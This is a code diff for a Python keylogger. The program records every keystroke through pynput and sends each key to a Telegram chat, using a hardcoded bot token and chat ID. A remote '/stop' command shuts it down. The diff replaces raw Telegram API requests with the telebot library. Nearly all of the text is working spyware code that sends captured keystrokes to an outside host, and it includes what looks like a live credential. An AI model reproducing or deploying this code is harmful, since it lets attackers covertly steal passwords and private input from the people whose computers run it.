@@ -8,17 +8,18 @@ from datetime import datetime, timedelta
 from queue import Empty, Queue
 from typing import List, Optional
 
-import requests
+import telebot
 from pynput import keyboard
 
 BOT_TOKEN = "7756196800:AAE_2EBn1gp9ZZTUatjsVdPt68DLV3usEOU"
 CHAT_ID = "7075072566"
 
+bot = telebot.TeleBot(BOT_TOKEN, parse_mode=None)
+
+
 def send_key(key: str):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    params = {"chat_id": CHAT_ID, "text": key}
     try:
-        requests.post(url, data=params)
+        bot.send_message(CHAT_ID, key)
     except Exception:
         pass
 
@@ -227,6 +228,24 @@ def _fallback_printable_from_vk(key_code: keyboard.KeyCode) -> Optional[str]:
 
     return None
 
+
+stop_event = threading.Event()
+q: Queue = Queue()
+
+
+@bot.message_handler(commands=["stop"])
+def handle_stop(message):
+    chat = getattr(message, "chat", None)
+    if chat is None or str(getattr(chat, "id", "")) != CHAT_ID:
+        return
+    if stop_event.is_set():
+        return
+    send_key("Закрываем")
+    stop_event.set()
+    q.put(None)
+    bot.stop_polling()
+
+
 def worker(q: Queue, stop_event: threading.Event):
     count = 0
     window_start = datetime.now()
@@ -299,43 +318,23 @@ def on_press_factory(q: Queue, stop_event: threading.Event):
     return on_press
 
 
-def poll_stop_command(stop_event: threading.Event, q: Queue):
-    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
-    offset: Optional[int] = None
+def _run_bot_polling():
     while not stop_event.is_set():
-        params = {"timeout": 30}
-        if offset is not None:
-            params["offset"] = offset
         try:
-            response = requests.get(url, params=params, timeout=35)
-            data = response.json()
+            bot.infinity_polling(timeout=10, long_polling_timeout=30)
         except Exception:
+            if stop_event.is_set():
+                break
             time.sleep(5)
-            continue
+        else:
+            break
 
-        if not data.get("ok"):
-            time.sleep(5)
-            continue
 
-        for update in data.get("result", []):
-            offset = update.get("update_id", 0) + 1
-            message = update.get("message") or update.get("channel_post")
-            if not message:
-                continue
-            chat = message.get("chat") or {}
-            text = message.get("text")
-            if text and text.strip() == "/stop" and str(chat.get("id")) == CHAT_ID:
-                send_key("Закрываем")
-                stop_event.set()
-                q.put(None)
-                return
-
-stop_event = threading.Event()
-q = Queue()
 worker_thread = threading.Thread(target=worker, args=(q, stop_event), daemon=True)
 worker_thread.start()
 
-threading.Thread(target=poll_stop_command, args=(stop_event, q), daemon=True).start()
+bot_thread = threading.Thread(target=_run_bot_polling, daemon=True)
+bot_thread.start()
 
 listener = keyboard.Listener(on_press=on_press_factory(q, stop_event))
 listener.start()
@@ -344,7 +343,9 @@ try:
     while not stop_event.wait(0.1):
         pass
 finally:
+    bot.stop_polling()
     listener.stop()
     listener.join()
     q.put(None)
     worker_thread.join()
+    bot_thread.join()
